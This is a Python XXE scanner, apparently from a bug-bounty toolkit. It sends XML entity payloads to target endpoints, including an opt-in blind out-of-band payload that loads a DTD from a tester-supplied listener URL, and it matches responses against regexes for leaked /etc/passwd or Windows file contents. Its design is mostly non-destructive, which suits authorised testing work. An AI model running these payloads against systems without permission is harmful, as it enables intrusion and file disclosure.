#!/usr/bin/env python3
"""
XXE (XML External Entity) scanner.

Safe-by-default detection ladder:

1. Does the endpoint parse XML at all? (send well-formed vs malformed XML and
   compare — a parser that rejects malformed XML is a candidate.)
2. Internal-entity expansion: define `<!ENTITY x "CANARY">` and reference it.
   If the CANARY comes back expanded, the parser resolves entities — the
   pre-condition for XXE. Non-destructive (no file/network access).
3. Error-based disclosure: a SYSTEM entity to a bogus path; parser errors that
   leak file contents or paths confirm external-entity processing.
4. OOB (opt-in, --oob URL): emit a blind XXE payload pointing at your
   interactsh/collaborator host. Confirmation happens in the listener, not here.

The verdict logic is pure and unit-tested; only `scan()` touches the network.

Severity model:
  HIGH    file contents / directory listing reflected, OR OOB payload emitted to
          a listener you control (blind XXE — confirm the callback).
  MEDIUM  internal entity expands (entity processing ON) — weaponise with a
          gadget or OOB channel; also a parser error that leaks a filesystem path.
  LOW     endpoint parses XML but does not expand internal entities (hardened
          parser) — recorded so you can retest with parameter entities.

Usage:
  tools/xxe_scanner.py https://target.com/api/xml
  tools/xxe_scanner.py https://target.com/soap --oob http://abc.oast.fun --json
  tools/xxe_scanner.py -l xml_endpoints.txt --cookie "s=..."
"""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tools.safe_http import safe_urlopen  # noqa: E402

_FILE_LEAK = re.compile(r"root:.*?:0:0:|\[boot loader\]|; for 16-bit app support|<value>.*?/etc/", re.S)
_PATH_LEAK = re.compile(r"(No such file or directory|failed to load external entity|SystemId|"
                        r"java\.io\.FileNotFoundException|/etc/[a-z]+|file:/{2,3}[A-Za-z0-9/._-]+)", re.I)


@dataclass
class XxeFinding:
    url: str
    severity: str
    reason: str
    payload_kind: str


def build_payloads(canary: str, oob_url: str | None) -> dict[str, str]:
    """Pure: build the XML payload set. Returns {kind: xml}."""
    payloads = {
        "wellformed": '<?xml version="1.0"?><root><a>1</a></root>',
        "malformed": '<?xml version="1.0"?><root><a>1</root>',
        "internal_entity": (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY xxe "{canary}">]>'
            '<root><a>&xxe;</a></root>'
        ),
        "error_based": (
            '<?xml version="1.0"?>'
            '<!DOCTYPE r [<!ENTITY xxe SYSTEM '
            f'"file:///nonexistent_{canary}">]>'
            '<root><a>&xxe;</a></root>'
        ),
    }
    if oob_url:
        payloads["oob_blind"] = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{oob_url}/xxe.dtd"> %ext;]>'
            '<root><a>oob</a></root>'
        )
    return payloads


def classify(canary: str, results: dict[str, tuple[int, str]], oob_url: str | None) -> XxeFinding | None:
    """Pure: given {kind: (status, body)} responses, return the strongest verdict."""
    # 1. File disclosure = strongest.
    for kind in ("error_based", "internal_entity", "oob_blind"):
        if kind in results:
            _, body = results[kind]
            if _FILE_LEAK.search(body):
                return XxeFinding("", "HIGH", "file contents disclosed via XML entity — confirmed XXE", kind)

    # 2. Internal entity expansion.
    if "internal_entity" in results:
        _, body = results["internal_entity"]
        if canary in body:
            return XxeFinding("", "MEDIUM",
                              "internal entity expanded (entity processing enabled) — escalate with OOB/parameter entities",
                              "internal_entity")

    # 3. Error-based path leak.
    if "error_based" in results:
        _, body = results["error_based"]
        if _PATH_LEAK.search(body):
            return XxeFinding("", "MEDIUM", "XML parser leaked a filesystem path/error resolving SYSTEM entity", "error_based")

    # 4. OOB emitted (confirmation is external).
    if oob_url and "oob_blind" in results and results["oob_blind"][0] not in (0,):
        return XxeFinding("", "HIGH",
                          f"blind XXE payload delivered — check your listener at {oob_url} for a callback", "oob_blind")

    # 5. Parses XML but no expansion.
    if "wellformed" in results and "malformed" in results:
        wf, mf = results["wellformed"][0], results["malformed"][0]
        if wf and mf and wf != mf:
            return XxeFinding("", "LOW",
                              "endpoint parses XML (well-formed vs malformed differ) but no entity expansion observed", "wellformed")
    return None


def _post_xml(url, xml, headers, timeout):
    req = urllib.request.Request(url, data=xml.encode(), headers=headers, method="POST")
    try:
        resp = safe_urlopen(req, timeout=timeout)
        return resp.getcode(), resp.read(1_000_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read(500_000).decode("utf-8", "replace") if hasattr(e, "read") else ""
        return e.code, body
    except (urllib.error.URLError, TimeoutError, ConnectionError, ValueError):
        return 0, ""


def scan(url: str, oob_url: str | None = None, cookie: str | None = None, timeout: int = 15) -> list[XxeFinding]:
    canary = "XXE" + os.urandom(4).hex().upper()
    headers = {"User-Agent": "Mozilla/5.0 (BugHunter XXE scanner)", "Content-Type": "application/xml"}
    if cookie:
        headers["Cookie"] = cookie
    results: dict[str, tuple[int, str]] = {}
    for kind, xml in build_payloads(canary, oob_url).items():
        results[kind] = _post_xml(url, xml, headers, timeout)
    v = classify(canary, results, oob_url)
    if v:
        v.url = url
        return [v]
    return []


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="XXE scanner")
    ap.add_argument("url", nargs="?", help="XML/SOAP endpoint URL")
    ap.add_argument("-l", "--list", help="file of URLs (one per line)")
    ap.add_argument("--oob", help="OOB collaborator/interactsh base URL for blind XXE")
    ap.add_argument("--cookie", help="Cookie header")
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--json", action="store_true", help="machine-readable output")
    args = ap.parse_args(argv)

    urls = []
    if args.list:
        with open(args.list) as fh:
            urls = [ln.strip() for ln in fh if ln.strip() and not ln.startswith("#")]
    elif args.url:
        urls = [args.url]
    else:
        ap.error("provide a URL or -l <file>")

    findings = []
    for u in urls:
        findings.extend(scan(u, oob_url=args.oob, cookie=args.cookie, timeout=args.timeout))

    if args.json:
        print(json.dumps([f.__dict__ for f in findings], indent=2))
    else:
        if not findings:
            print("[xxe] nothing flagged")
        for f in findings:
            print(f"[{f.severity}] {f.url} ({f.payload_kind}): {f.reason}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
